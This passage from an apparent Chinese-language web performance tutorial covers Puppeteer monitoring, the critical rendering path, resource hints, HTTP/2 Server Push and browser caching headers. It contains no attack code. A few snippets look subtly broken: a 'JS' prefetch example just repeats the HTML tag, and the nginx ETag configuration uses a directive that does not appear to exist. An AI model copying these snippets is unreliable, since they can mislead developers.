align="left">page.metrics()</td><td align="left">获取 JS 堆大小&#x2F;节点数等运行时指标</td></tr><tr><td align="left">网络拦截</td><td align="left">page.setRequestInterception(true)</td><td align="left">模拟 API 失败&#x2F;延迟</td></tr></tbody></table><p>合成监控实现方案：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> puppeteer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;puppeteer&#x27;</span>);<br><br>(<span class="hljs-title function_">async</span> () =&gt; &#123;<br>  <span class="hljs-keyword">const</span> browser = <span class="hljs-keyword">await</span> puppeteer.<span class="hljs-title function_">launch</span>();<br>  <span class="hljs-keyword">const</span> page = <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">newPage</span>();<br>  <br>  <span class="hljs-comment">// 启动性能跟踪</span><br>  <span class="hljs-keyword">await</span> page.<span class="hljs-property">tracing</span>.<span class="hljs-title function_">start</span>(&#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;trace.json&#x27;</span> &#125;);<br>  <br>  <span class="hljs-comment">// 模拟用户流</span><br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">goto</span>(<span class="hljs-string">&#x27;https://example.com&#x27;</span>, &#123; <span class="hljs-attr">waitUntil</span>: <span class="hljs-string">&#x27;networkidle2&#x27;</span> &#125;);<br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">type</span>(<span class="hljs-string">&#x27;#search&#x27;</span>, <span class="hljs-string">&#x27;performance&#x27;</span>);<br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">click</span>(<span class="hljs-string">&#x27;#submit&#x27;</span>);<br>  <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">waitForSelector</span>(<span class="hljs-string">&#x27;.results&#x27;</span>);<br>  <br>  <span class="hljs-comment">// 停止跟踪并输出指标</span><br>  <span class="hljs-keyword">await</span> page.<span class="hljs-property">tracing</span>.<span class="hljs-title function_">stop</span>();<br>  <span class="hljs-keyword">const</span> perfMetrics = <span class="hljs-keyword">await</span> page.<span class="hljs-title function_">metrics</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;JSHeapUsedSize:&#x27;</span>, perfMetrics.<span class="hljs-property">JSHeapUsedSize</span>);<br>  <br>  <span class="hljs-keyword">await</span> browser.<span class="hljs-title function_">close</span>();<br>&#125;)();<br></code></pre></td></tr></table></figure><p><strong>WebPageTest vs Puppeteer 对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">WebPageTest</th><th align="left">Puppeteer</th></tr></thead><tbody><tr><td align="left">部署模式</td><td align="left">云端 SaaS</td><td align="left">本地 Node.js 环境</td></tr><tr><td align="left">扩展性</td><td align="left">受限（仅支持内置命令）</td><td align="left">无限（可编程控制）</td></tr><tr><td align="left">报告深度</td><td align="left">开箱即用（含视频&#x2F;瀑布流）</td><td align="left">需自行实现数据可视化</td></tr><tr><td align="left">成本</td><td align="left">免费版有限额，企业版付费</td><td align="left">开源免费，需自建基础设施</td></tr><tr><td align="left">适用场景</td><td align="left">快速获取多地点测试报告</td><td align="left">CI&#x2F;CD 流水线集成、复杂场景精准测试</td></tr></tbody></table><h1 id="二、网络层优化"><a href="#二、网络层优化" class="headerlink" title="二、网络层优化"></a>二、网络层优化</h1><h2 id="2-1-资源加载策略"><a href="#2-1-资源加载策略" class="headerlink" title="2.1 资源加载策略"></a>2.1 资源加载策略</h2><h3 id="关键渲染路径优化（Critical-Rendering-Path）"><a href="#关键渲染路径优化（Critical-Rendering-Path）" class="headerlink" title="关键渲染路径优化（Critical Rendering Path）"></a>关键渲染路径优化（Critical Rendering Path）</h3><p><strong>关键渲染路径（CRP）核心概念</strong></p><ul><li>定义<ul><li>浏览器将 HTML&#x2F;CSS&#x2F;JS 转换为可视像素的完整处理链条</li><li>从接收字节流到渲染首屏内容的关键步骤序列</li></ul></li><li>优化目标<ul><li>最小化 首次内容绘制时间（FCP）</li><li>缩短 首次有效渲染时间（First Meaningful Paint）</li></ul></li></ul><p><strong>CRP 核心处理阶段</strong></p><pre class="mermaid">graph TDA[下载HTML] --> B[构建DOM树]A --> C[下载CSS构建CSSOM树]B & C --> D[合并生成渲染树]D --> E[布局计算]E --> F[像素绘制]</pre><p><strong>阶段详解</strong></p><ul><li>DOM 构建（Parse HTML）<ul><li>边下载边解析，遇 <code>&lt;script&gt;</code> 会阻塞解析（除非 async&#x2F;defer）</li><li>遇 <code>&lt;link rel=&quot;stylesheet&quot;&gt;</code> 不阻塞 DOM 解析但阻塞渲染</li></ul></li><li>CSSOM 构建<ul><li>完全渲染阻塞：浏览器需完整 CSSOM 才能渲染页面</li><li>特性：层叠规则导致 CSS 解析不可增量（底部样式可覆盖顶部）</li></ul></li><li>渲染树（Render Tree）:合并 DOM + CSSOM，排除不可见元素（如 display:none）</li><li>布局（Layout&#x2F;Reflow）:计算所有元素的几何位置（视口尺寸影响结果）<br>*绘制（Paint）:将布局结果转为屏幕像素（可能分多层绘制）</li></ul><p><strong>阻塞行为深度解析</strong></p><table><thead><tr><th align="left">资源类型</th><th align="left">DOM 构建</th><th align="left">渲染阻塞</th><th align="left">优化策略</th></tr></thead><tbody><tr><td align="left">同步 <code>&lt;script&gt;</code></td><td align="left">阻塞</td><td align="left">阻塞</td><td align="left">async&#x2F;defer</td></tr><tr><td align="left">外部 CSS</td><td align="left">不阻塞</td><td align="left">阻塞</td><td align="left">内联关键CSS</td></tr><tr><td align="left">媒体查询 CSS</td><td align="left">不阻塞</td><td align="left">条件阻塞</td><td align="left">拆分非关键CSS</td></tr><tr><td align="left"><code>&lt;img&gt;</code></td><td align="left">不阻塞</td><td align="left">不阻塞</td><td align="left">懒加载</td></tr><tr><td align="left">异步 <code>&lt;script&gt;</code></td><td align="left">不阻塞</td><td align="left">不阻塞</td><td align="left">预加载</td></tr></tbody></table><p><strong>CRP 优化五大策略</strong></p><p>(1) 最小化关键资源数量</p><ul><li>移除非首屏必需 JS&#x2F;CSS（如分析脚本延迟加载）</li></ul><p>(2) 压缩关键资源体积</p><ul><li>极限压缩 CSS&#x2F;JS（Terser + CSSNano）</li><li>内联核心 CSS（控制在 14KB 以内以利用 TCP 慢启动）</li></ul><p>(3) 缩短关键路径长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 非关键CSS异步加载 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;non-critical.css&quot; as=&quot;style&quot; onload=&quot;this.rel=&#x27;stylesheet&#x27;&quot;&gt;<br>&lt;noscript&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;non-critical.css&quot;&gt;&lt;/noscript&gt;<br></code></pre></td></tr></table></figure><p>(4) 优化 JavaScript 加载优先级</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 首屏必需脚本：添加 preload --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.js&quot; as=&quot;script&quot;&gt;<br><br>&lt;!-- 非必需脚本：延迟执行 --&gt;<br>&lt;script src=&quot;analytics.js&quot; defer&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>(5) 并行化资源加载</p><ul><li>使用 HTTP&#x2F;2 多路复用避免队头阻塞</li><li>预建立连接：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>CRP 优化检查清单</strong></p><ol><li>首屏内容所需 CSS 内联到 <code>&lt;style&gt;</code> 标签</li><li>非关键 CSS 异步加载（preload + onload）</li><li>所有 <code>&lt;script&gt;</code> 添加 async 或 defer</li><li>图片&#x2F;字体使用 preload 提前获取</li><li>配置 HTTP&#x2F;2 服务端推送关键资源</li><li>使用骨架屏占位避免布局偏移（CLS）</li></ol><h3 id="资源优先级：preload-prefetch-preconnect"><a href="#资源优先级：preload-prefetch-preconnect" class="headerlink" title="资源优先级：preload, prefetch, preconnect"></a>资源优先级：preload, prefetch, preconnect</h3><p><strong>核心机制对比</strong></p><table><thead><tr><th align="left">指令</th><th align="left">加载优先级</th><th align="left">适用场景</th><th align="left">浏览器支持</th><th align="left">典型生命周期</th></tr></thead><tbody><tr><td align="left">preload</td><td align="left">最高（立即加载）</td><td align="left">当前路由关键资源（字体&#x2F;首图）</td><td align="left">93% (2023)</td><td align="left">当前页面</td></tr><tr><td align="left">prefetch</td><td align="left">最低（空闲加载）</td><td align="left">下个路由可能用到的资源</td><td align="left">92%</td><td align="left">跨页面缓存</td></tr><tr><td align="left">preconnect</td><td align="left">连接优先</td><td align="left">高频第三方源（CDN&#x2F;API）</td><td align="left">96%</td><td align="left">连接保持10s</td></tr></tbody></table><p><strong>preload 深度解析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 基本用法 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;font.woff2&quot; as=&quot;font&quot; type=&quot;font/woff2&quot; crossorigin&gt;<br><br>&lt;!-- 媒体查询扩展 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;desktop.css&quot; as=&quot;style&quot; media=&quot;(min-width: 1024px)&quot;&gt;<br></code></pre></td></tr></table></figure><p>核心功能：</p><ul><li>强制浏览器提前请求：无视默认资源发现顺序</li><li>as 属性必填：声明资源类型（font&#x2F;image&#x2F;script&#x2F;style）<ul><li>错误类型将导致重复下载（如 as&#x3D;”style” 实际是JS）</li></ul></li><li>跨域要求：字体文件需加 crossorigin 属性</li></ul><p>最佳实践场景：</p><ul><li>首屏关键字体：防止FOIT（字体未加载时不可见文本）</li><li>首屏大图：配合 as&#x3D;”image” 提升LCP元素加载优先级</li><li>关键脚本：优先加载影响FCP的JS（如框架运行时）</li></ul><p>使用陷阱：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 反例：未设置as属性 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;critical.js&quot;&gt; ❌ 触发二次下载<br><br>&lt;!-- 反例：预加载非关键资源 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;background.jpg&quot;&gt; ❌ 浪费带宽<br></code></pre></td></tr></table></figure><p><strong>prefetch 应用策略</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- HTML 声明式 --&gt;<br>&lt;link rel=&quot;prefetch&quot; href=&quot;product-list.js&quot; as=&quot;script&quot;&gt;<br><br>&lt;!-- JS 编程式 --&gt;<br>&lt;link rel=&quot;prefetch&quot; href=&quot;product-list.js&quot; as=&quot;script&quot;&gt;<br></code></pre></td></tr></table></figure><p>实现方式：</p><ul><li>低优先级加载：仅在浏览器空闲时请求</li><li>HTTP 缓存：资源存储在 disk-cache，有效期由 Cache-Control 控制</li></ul><p>典型场景：</p><p>(1) 路由级代码分割：预取下个页面的JS模块</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React 路由预取示例</span><br><span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackPrefetch: true */</span> <span class="hljs-string">&#x27;./ProductPage&#x27;</span>)<br></code></pre></td></tr></table></figure><p>(2) 数据预取：提前获取用户可能访问的API数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;link rel=&quot;prefetch&quot; href=&quot;/api/recommendations&quot; as=&quot;fetch&quot;&gt;<br></code></pre></td></tr></table></figure><p>性能权衡：</p><ul><li>✅ 带宽充足时减少后续页面加载时间（提升导航速度30-50%）</li><li>❌ 弱网环境可能抢占关键资源带宽</li></ul><p><strong>preconnect 技术细节</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 基本用法 --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot;&gt;<br><br>&lt;!-- 扩展资源提示 --&gt;<br>&lt;link rel=&quot;preconnect&quot; href=&quot;https://cdn.example.com&quot; crossorigin&gt;<br></code></pre></td></tr></table></figure><p>链接建立过程：</p><pre class="mermaid">graph LRA[preconnect] --> B[DNS解析]A --> C[TCP握手]A --> D[TLS协商] D --> E[保持连接池]</pre><ul><li>节省时间：提前完成100-500ms的网络握手</li><li>适用场景：已知需请求的第三方域（Google Fonts&#x2F;Analytics）</li></ul><p>实施规范：</p><ul><li>跨域要求：CORS资源需加 crossorigin</li><li>连接保持：默认10秒无请求则关闭（Chrome行为）</li></ul><p>智能决策：</p><ul><li>高频域：主CDN&#x2F;静态资源域（如 static.example.com）</li><li>关键第三方：支付SDK&#x2F;认证服务（如 auth0.com）</li><li>避免过度：&gt;4个preconnect可能被浏览器忽略</li></ul><p><strong>组合优化策略</strong></p><p>(1) 分阶段资源提示</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;head&gt;<br>  &lt;!-- 阶段1：关键资源 --&gt;<br>  &lt;link rel=&quot;preload&quot; href=&quot;main.css&quot; as=&quot;style&quot;&gt;<br>  <br>  &lt;!-- 阶段2：第三方连接 --&gt;<br>  &lt;link rel=&quot;preconnect&quot; href=&quot;https://fonts.gstatic.com&quot;&gt;<br>  <br>  &lt;!-- 阶段3：预测性资源 --&gt;<br>  &lt;link rel=&quot;prefetch&quot; href=&quot;checkout.js&quot; as=&quot;script&quot;&gt;<br>&lt;/head&gt;<br></code></pre></td></tr></table></figure><p>(2) 优先级冲突规避</p><table><thead><tr><th align="left">资源类型</th><th align="left">preload</th><th align="left">prefetch</th><th align="left">风险</th></tr></thead><tbody><tr><td align="left">首屏图片</td><td align="left">✅</td><td align="left">❌</td><td align="left">重复加载浪费带宽</td></tr><tr><td align="left">非首屏组件JS</td><td align="left">❌</td><td align="left">✅</td><td align="left">弱网环境延迟关键请求</td></tr><tr><td align="left">字体文件</td><td align="left">✅</td><td align="left">❌</td><td align="left">不加crossorigin失效</td></tr></tbody></table><h3 id="HTTP-2-Server-Push-策略设计"><a href="#HTTP-2-Server-Push-策略设计" class="headerlink" title="HTTP&#x2F;2 Server Push 策略设计"></a>HTTP&#x2F;2 Server Push 策略设计</h3><p><strong>工作原理</strong></p><pre class="mermaid">sequenceDiagram    participant Client as 浏览器    participant Server as 服务器    Client->>Server: 请求 index.html    Server->>Client: 响应 HTML + PUSH_PROMISE 帧（声明推送资源）    Server->>Client: 同时推送 style.css 和 script.js    Client->>Server: 无需再请求 style.css/script.js</pre><ul><li>主动推送：服务器在响应主请求时主动发送关联资源</li><li>协议层实现：通过 PUSH_PROMISE 帧声明即将推送的资源</li><li>客户端缓存：浏览器将推送资源存入缓存，遇到对应标签时直接使用</li></ul><p><strong>与传统优化的对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">HTTP&#x2F;1.1 资源合并</th><th align="left">HTTP&#x2F;2 Server Push</th></tr></thead><tbody><tr><td align="left">请求数量</td><td align="left">减少（合并文件）</td><td align="left">不减少但并行传输</td></tr><tr><td align="left">缓存效率</td><td align="left">低（整包缓存）</td><td align="left">高（资源独立缓存）</td></tr><tr><td align="left">更新粒度</td><td align="left">整文件更新</td><td align="left">单文件更新</td></tr><tr><td align="left">关键路径优化</td><td align="left">有限</td><td align="left">显著（预置关键资源）</td></tr></tbody></table><p><strong>推送策略设计原则</strong></p><p>推送决策矩阵：</p><table><thead><tr><th align="left">资源类型</th><th align="left">是否推送</th><th align="left">理由</th></tr></thead><tbody><tr><td align="left">首屏关键CSS</td><td align="left">✅</td><td align="left">消除渲染阻塞</td></tr><tr><td align="left">首屏关键JS</td><td align="left">✅</td><td align="left">提前编译执行</td></tr><tr><td align="left">首屏大图</td><td align="left">✅</td><td align="left">提升LCP</td></tr><tr><td align="left">非首屏JS&#x2F;CSS</td><td align="left">❌</td><td align="left">浪费带宽，可能抢占关键资源</td></tr><tr><td align="left">低频使用资源</td><td align="left">❌</td><td align="left">缓存利用率低</td></tr><tr><td align="left">用户特定内容</td><td align="left">❌</td><td align="left">无法预判用户需求</td></tr></tbody></table><p>智能推送触发条件:</p><ul><li>基于HTML依赖分析: 解析HTML中的 <code>&lt;link&gt;, &lt;script&gt;</code> 标签自动推送</li><li>配置白名单：</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx 配置示例</span><br><span class="hljs-attribute">http2_push</span> /static/css/core.css; <br><span class="hljs-attribute">http2_push</span> /static/js/main.js;<br></code></pre></td></tr></table></figure><ul><li>动态决策（需编程实现）</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Node.js 动态推送</span><br>res.<span class="hljs-property">stream</span>.<span class="hljs-title function_">pushStream</span>(&#123; <span class="hljs-string">&#x27;:path&#x27;</span>: <span class="hljs-string">&#x27;/critical.css&#x27;</span> &#125;, <span class="hljs-function">(<span class="hljs-params">err, pushStream</span>) =&gt;</span> &#123;<br>  pushStream.<span class="hljs-title function_">respondWithFile</span>(<span class="hljs-string">&#x27;/path/to/critical.css&#x27;</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>风险规避策略</strong></p><table><thead><tr><th align="left">风险</th><th align="left">解决方案</th></tr></thead><tbody><tr><td align="left">推送冗余资源</td><td align="left">配置ETag验证，客户端缓存存在时跳过推送</td></tr><tr><td align="left">带宽竞争</td><td align="left">限制推送资源数量（≤3个）</td></tr><tr><td align="left">队头阻塞</td><td align="left">设置优先级权重（Weight）</td></tr><tr><td align="left">缓存污染</td><td align="left">为推送资源设置短缓存（max-age&#x3D;300）</td></tr></tbody></table><p><strong>使用前检查清单</strong></p><ol><li>确认服务器支持 HTTP&#x2F;2（Nginx ≥ 1.13.9）</li><li>仅推送 ≤3个关键渲染路径资源</li><li>为推送资源设置版本化路径</li><li>实现缓存状态验证（Cache-Digest）</li><li>监控推送资源命中率（CDN日志）</li><li>配置降级策略（不支持HTTP&#x2F;2时回退preload）</li></ol><h2 id="2-2-缓存机制"><a href="#2-2-缓存机制" class="headerlink" title="2.2 缓存机制"></a>2.2 缓存机制</h2><h3 id="强缓存：Cache-Control-Expires"><a href="#强缓存：Cache-Control-Expires" class="headerlink" title="强缓存：Cache-Control &#x2F; Expires"></a>强缓存：Cache-Control &#x2F; Expires</h3><p><strong>工作原理</strong></p><pre class="mermaid">sequenceDiagram    participant Browser as 浏览器    participant Cache as 本地缓存    participant Server as 服务器        Browser->>Cache: 请求资源    alt 缓存有效        Cache-->>Browser: 直接返回缓存(状态码200 from cache)    else 缓存失效        Browser->>Server: 发送请求        Server-->>Browser: 返回资源 + 新缓存头    end</pre><ul><li>无网络请求：命中缓存时不产生任何网络流量</li><li>HTTP状态码：<ul><li>Chrome：200 (from disk cache) 或 200 (from memory cache)</li><li>Firefox：200 OK (cached)</li></ul></li></ul><p><strong>Expires：绝对时间控制</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Expires</span><span class="hljs-punctuation">: </span>Wed, 21 Oct 2025 07:28:00 GMT<br></code></pre></td></tr></table></figure><ul><li>基于服务端时间：指定资源的具体过期时间点</li><li>时区要求：必须使用 GMT 格式</li><li>致命缺陷：<ul><li>依赖客户端与服务端时钟严格同步（时差导致缓存失效）</li><li>无法应对时区切换（如夏令时调整）</li></ul></li><li>使用场景：<ul><li>仅需兼容IE8及以下浏览器的系统</li><li>静态资源版本变更频率极低（如年更）</li></ul></li></ul><p><strong>Cache-Control：现代缓存控制</strong></p><p>指令全集（常用20+指令）：</p><table><thead><tr><th align="left">指令类型</th><th align="left">关键指令</th><th align="left">值格式</th><th align="left">功能说明</th></tr></thead><tbody><tr><td align="left">过期控制</td><td align="left">max-age</td><td align="left">秒数（如 3600）</td><td align="left">资源有效期（相对时间）</td></tr><tr><td align="left">可缓存性</td><td align="left">public<br>private<br>no-store</td><td align="left">无值<br>无值<br>无值</td><td align="left">允许代理&#x2F;CDN缓存<br>仅限用户浏览器缓存<br>禁止任何缓存</td></tr><tr><td align="left">重新验证</td><td align="left">must-revalidate</td><td align="left">无值</td><td align="left">过期后必须回源验证</td></tr><tr><td align="left">特殊行为</td><td align="left">no-cache<br>immutable</td><td align="left">无值<br>无值</td><td align="left">每次使用前需验证（非字面意思）<br> 永不变更资源（版本化路径适用）</td></tr><tr><td align="left">缓存继承</td><td align="left">s-maxage</td><td align="left">秒数</td><td align="left">代理服务器专用max-age</td></tr></tbody></table><p>优先级规则：</p><pre class="mermaid">graph TB    A[Cache-Control] --> B[no-store] -->|最高| C[禁止缓存]    A --> D[no-cache] -->|次高| E[每次验证]    A --> F[max-age] -->|基础| G[相对时间缓存]    A --> H[Expires] -->|兜底| I[绝对时间缓存]</pre><p><strong>浏览器缓存存储机制</strong></p><table><thead><tr><th align="left">缓存类型</th><th align="left">存储位置</th><th align="left">生命周期</th><th align="left">容量限制</th></tr></thead><tbody><tr><td align="left">Memory Cache</td><td align="left">系统内存</td><td align="left">进程关闭即清除</td><td align="left">小（约10MB）</td></tr><tr><td align="left">Disk Cache</td><td align="left">硬盘分区</td><td align="left">持久化存储</td><td align="left">大（数百MB）</td></tr></tbody></table><p><strong>资源分配规则</strong></p><ul><li>大文件(&gt;1MB) –&gt; Disk Cache长期保留</li><li>小文件 –&gt; Memory Cache短期快速读取</li><li>预加载资源 –&gt; Memory Cache页面关闭即清除</li></ul><p><strong>强缓存失效策略</strong></p><p>(1) 主动更新机制</p><ul><li>URL版本化（最高效）：<code>/main.v2.3.1.js</code></li><li>查询参数变更（部分CDN不兼容）：<code>/data.json?v=20231021</code></li><li>文件名指纹（构建工具自动生成）：<code>/app.8e9d2a.js</code></li></ul><p>(2) 被动更新机制</p><ul><li>max-age 过期后自动失效</li><li>用户强制刷新（Ctrl+F5）跳过缓存</li></ul><p><strong>总结</strong></p><ol><li>所有静态资源设置 public</li><li>版本化资源添加 immutable</li><li>动态内容设置 private + 适当 max-age</li><li>敏感数据明确 no-store</li><li>配置 s-maxage 控制CDN缓存</li><li>弃用 Expires（优先使用 Cache-Control）</li></ol><h3 id="协商缓存：ETag-Last-Modified"><a href="#协商缓存：ETag-Last-Modified" class="headerlink" title="协商缓存：ETag &#x2F; Last-Modified"></a>协商缓存：ETag &#x2F; Last-Modified</h3><p><strong>工作原理</strong></p><pre class="mermaid">sequenceDiagram    participant Browser as 浏览器    participant Server as 服务器        Browser->>Server: 请求资源（携带 If-None-Match/If-Modified-Since）    alt 资源未变更        Server-->>Browser: 304 Not Modified（空响应体）        Browser->>Browser: 使用本地缓存    else 资源已变更        Server-->>Browser: 200 OK + 新资源 + 新验证头    end</pre><ul><li>条件请求：浏览器携带验证器询问资源是否变更</li><li>网络交互：无论是否变更都产生网络请求</li><li>状态码：<ul><li>304 Not Modified：资源未变更</li><li>200 OK：资源已更新</li></ul></li></ul><p><strong>Last-Modified：基于时间戳</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">### 首次响应<br><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Last-Modified</span><span class="hljs-punctuation">: </span>Wed, 21 Oct 2023 07:28:00 GMT<br><br><span class="language-apache"><span class="hljs-comment">### 后续请求</span></span><br><span class="language-apache"><span class="hljs-attribute">GET</span> /resource</span><br><span class="language-apache"><span class="hljs-attribute">If</span>-Modified-Since: Wed, <span class="hljs-number">21</span> Oct <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">28</span>:<span class="hljs-number">00</span> GMT</span><br></code></pre></td></tr></table></figure><ul><li>时间精度：最小单位为秒（1秒内多次修改无法识别）</li><li>验证逻辑：服务器对比当前资源修改时间与请求头时间</li></ul><p>致命缺陷：</p><table><thead><tr><th align="left">场景</th><th align="left">问题</th><th align="left">后果</th></tr></thead><tbody><tr><td align="left">文件内容不变但时间更新</td><td align="left">时间戳变化触发无效更新</td><td align="left">带宽浪费</td></tr><tr><td align="left">分布式服务器时间不同步</td><td align="left">修改时间偏差导致缓存失效</td><td align="left">频繁请求</td></tr><tr><td align="left">1秒内多次修改</td><td align="left">时间未变但内容已改</td><td align="left">返回过期内容</td></tr></tbody></table><p><strong>ETag：基于内容指纹</strong></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP">### 首次响应<br><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">ETag</span><span class="hljs-punctuation">: </span>&quot;13a-17d5ecc5d10&quot;<br><br><span class="language-routeros"><span class="hljs-comment">### 后续请求</span></span><br><span class="language-routeros"><span class="hljs-built_in">GET</span> <span class="hljs-built_in">/resource</span></span><br><span class="hljs-built_in"><span class="language-routeros"></span>If-None-Match: <span class="hljs-string">&quot;13a-17d5ecc5d10&quot;</span></span><br></code></pre></td></tr></table></figure><ul><li>指纹生成算法：<ul><li>强验证器：内容哈希值（如 SHA-1）</li><li>弱验证器（W&#x2F;前缀）：仅检查语义变化（如 W&#x2F;“13a”）</li></ul></li><li>优先级规则：ETag 优先级高于 Last-Modified</li></ul><p>优势对比：</p><table><thead><tr><th align="left">维度</th><th align="left">ETag</th><th align="left">Last-Modified</th></tr></thead><tbody><tr><td align="left">修改检测精度</td><td align="left">字节级（内容哈希）</td><td align="left">秒级（文件系统时间）</td></tr><tr><td align="left">分布式一致性</td><td align="left">稳定（内容决定指纹）</td><td align="left">依赖时间同步</td></tr><tr><td align="left">资源变更识别</td><td align="left">内容不变指纹一定不变</td><td align="left">时间可能误变</td></tr></tbody></table><p><strong>服务端验证逻辑</strong></p><p>配置：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> / &#123;<br>    <span class="hljs-comment"># 启用ETag（默认开启）</span><br>    <span class="hljs-attribute">etag</span> <span class="hljs-literal">on</span>;<br>    <br>    <span class="hljs-comment"># 弱ETag配置（节省CPU）</span><br>    <span class="hljs-attribute">etag_format</span> <span class="hljs-string">&#x27;W/&quot;%x-%t&quot;&#x27;</span>;  <span class="hljs-comment"># 文件大小+修改时间</span><br>    <br>    <span class="hljs-comment"># 禁用Last-Modified</span><br>    <span class="hljs-attribute">add_header</span> Last-Modified <span class="hljs-string">&quot;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>决策过程：</p><pre class="mermaid">graph TD    A[收到请求] --> B{携带 If-None-Match?}    B -->|是| C[比较ETag]    B -->|否| D{携带 If-Modified-Since?}    D -->|是| E[比较时间戳]    D -->|否| F[返回200]    C -->|匹配| G[返回304]    C -->|不匹配| F    E -->|未修改| G    E -->|已修改| F</pre><p><strong>ETag 生成策略</strong></p><p>最佳实践：</p><table><thead><tr><th align="left">资源类型</th><th align="left">推荐算法</th><th align="left">示例</th><th align="left">特点</th></tr></thead><tbody><tr><td align="left">静态文件</td><td align="left">强ETag（内容哈希）</td><td align="left">ETag: “5d83c-17a9”</td><td 